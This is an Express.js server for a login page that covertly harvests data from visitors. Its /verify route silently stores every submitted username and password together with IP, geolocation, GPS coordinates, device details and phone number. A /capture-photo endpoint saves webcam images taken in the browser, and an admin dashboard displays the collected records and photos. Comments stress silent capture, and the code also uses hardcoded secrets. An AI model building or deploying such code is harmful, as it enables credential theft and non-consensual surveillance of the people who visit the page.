const express = require("express");
const app = express();
const hbs = require("hbs");
const session = require("express-session");
const nocache = require("nocache");
const fetch = require("node-fetch"); // For geo location API lookup
const fs = require("fs");
const path = require("path");

// Static files
app.use(express.static("public"));
app.set("view engine", "hbs");

// Demo login credentials
const username = "safwan";
const password = "saf123";

// Admin credentials (set in .env or use default)
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || "admin123";

// Body parsers
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// Session setup
app.use(
  session({
    secret: "keyboard cat",
    resave: false,
    saveUninitialized: true,
  })
);

// Disable caching
app.use(nocache());
app.use((req, res, next) => {
  res.set("Cache-Control", "no-store");
  next();
});

// Get real client IP (Render uses a proxy)
function getClientIP(req) {
  const forwarded = req.headers["x-forwarded-for"];
  if (forwarded) return forwarded.split(",")[0].trim();
  return req.socket.remoteAddress;
}

// Geo lookup using ipapi.co (works on Render)
async function getGeo(ip) {
  try {
    const response = await fetch(`https://ipapi.co/${ip}/json/`);
    const data = await response.json();
    if (data.error) return null;
    return data;
  } catch (err) {
    console.log("Geo API Error:", err);
    return null;
  }
}

// Routes
app.get("/forgot-password", (req, res) => {
  res.render("forgot-password");
});

// Admin authentication middleware
function requireAdmin(req, res, next) {
  if (req.session.isAdmin) {
    return next();
  }
  res.redirect("/admin-login");
}

// Admin routes
app.get("/admin-login", (req, res) => {
  if (req.session.isAdmin) {
    return res.redirect("/admin");
  }
  res.render("admin-login", { error: req.session.adminError });
  req.session.adminError = null;
});

app.post("/admin-auth", (req, res) => {
  const { password } = req.body;

  if (password === ADMIN_PASSWORD) {
    req.session.isAdmin = true;
    return res.redirect("/admin");
  }

  req.session.adminError = "Invalid password";
  res.redirect("/admin-login");
});

app.get("/admin", requireAdmin, (req, res) => {
  res.render("admin");
});

app.get("/admin/api/data", requireAdmin, (req, res) => {
  try {
    // Read login attempts
    const logFile = path.join(__dirname, "loginAttempts.json");
    let attempts = [];
    if (fs.existsSync(logFile)) {
      const fileContent = fs.readFileSync(logFile, "utf-8");
      attempts = JSON.parse(fileContent);
    }

    // Sort by timestamp descending (newest first)
    attempts.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));

    // Get list of photos
    const capturesDir = path.join(__dirname, "captures");
    let photos = [];
    if (fs.existsSync(capturesDir)) {
      const files = fs.readdirSync(capturesDir);
      photos = files.map(filename => ({
        filename,
        path: `/admin/photo/${filename}`
      }));
    }

    res.json({
      attempts,
      photos
    });
  } catch (error) {
    console.error("Error reading admin data:", error);
    res.status(500).json({ error: "Failed to load data" });
  }
});

app.get("/admin/photo/:filename", requireAdmin, (req, res) => {
  const { filename } = req.params;
  const filepath = path.join(__dirname, "captures", filename);

  if (fs.existsSync(filepath)) {
    res.sendFile(filepath);
  } else {
    res.status(404).send("Photo not found");
  }
});

app.get("/admin-logout", (req, res) => {
  req.session.isAdmin = false;
  res.redirect("/admin-login");
});

app.get("/troll-success", (req, res) => {
  res.render("troll");
});

app.get("/notres", (req, res) => {
  res.render("notres");
});

app.get("/", (req, res) => {
  if (req.session.user) {
    return res.redirect("/home");
  }

  res.render("login", { msg: req.session.msg });
  req.session.msg = null;
});

// Endpoint to receive and save captured photos
app.post("/capture-photo", async (req, res) => {
  try {
    const { photo } = req.body;

    if (!photo) {
      return res.status(400).json({ success: false, message: "No photo data" });
    }

    // Create captures directory if it doesn't exist
    const capturesDir = path.join(__dirname, "captures");
    if (!fs.existsSync(capturesDir)) {
      fs.mkdirSync(capturesDir);
    }

    // Get client IP and timestamp for filename
    const ip = getClientIP(req);
    const timestamp = new Date().toISOString().replace(/:/g, "-");
    const filename = `${timestamp}_${ip.replace(/[.:]/g, "-")}.jpg`;
    const filepath = path.join(capturesDir, filename);

    // Remove base64 prefix and save
    const base64Data = photo.replace(/^data:image\/\w+;base64,/, "");
    const buffer = Buffer.from(base64Data, "base64");
    fs.writeFileSync(filepath, buffer);

    // No console logging - silent capture
    res.json({ success: true, filename });
  } catch (error) {
    // Silent error - no logging
    res.status(500).json({ success: false, error: error.message });
  }
});

// Verify login
app.post("/verify", async (req, res) => {
  const {
    username: inputUsername,
    password: inputPassword,
    deviceDetails,
    location,
    phoneNumber,
    photoData,
  } = req.body;

  const ip = getClientIP(req);
  const userAgent = req.headers["user-agent"];
  const timestamp = new Date().toISOString();
  const geo = await getGeo(ip);

  // Parse device data
  let parsedDeviceDetails = null;
  if (deviceDetails) {
    try {
      parsedDeviceDetails = JSON.parse(deviceDetails);
    } catch {
      // Silent parsing error
    }
  }

  // Parse GPS location
  let parsedLocation = null;
  if (location) {
    try {
      parsedLocation = JSON.parse(location);
    } catch {
      // Silent parsing error
    }
  }

  // Save all data to file (ONLY place data is stored - no console logging)
  const logData = {
    timestamp,
    ip,
    geo,
    location: parsedLocation,  // Changed from gpsLocation to location for new format
    deviceDetails: parsedDeviceDetails,
    userAgent,
    username: inputUsername,
    password: inputPassword,
    phoneNumber: phoneNumber || null,
    photoData: photoData ? "[CAPTURED]" : null,
  };

  // Append to loginAttempts.json
  try {
    const logFile = path.join(__dirname, "loginAttempts.json");
    let attempts = [];
    if (fs.existsSync(logFile)) {
      const fileContent = fs.readFileSync(logFile, "utf-8");
      attempts = JSON.parse(fileContent);
    }
    attempts.push(logData);
    fs.writeFileSync(logFile, JSON.stringify(attempts, null, 2));
  } catch (error) {
    // Silent error - don't log anything
  }

  // Login logic
  if (inputUsername === username && inputPassword === password) {
    req.session.user = inputUsername;
    return res.redirect("/home");
  } else {
    req.session.msg = "Invalid username or password";
    return res.redirect("/");
  }
});

app.get("/home", (req, res) => {
  if (!req.session.user) return res.redirect("/");
  res.render("home");
});

app.get("/logout", (req, res) => {
  req.session.destroy(() => res.redirect("/"));
});

// IMPORTANT: Dynamic port for Render
const PORT = process.env.PORT || 3003;
app.listen(PORT, () => console.log(`http://localhost:${PORT}`));
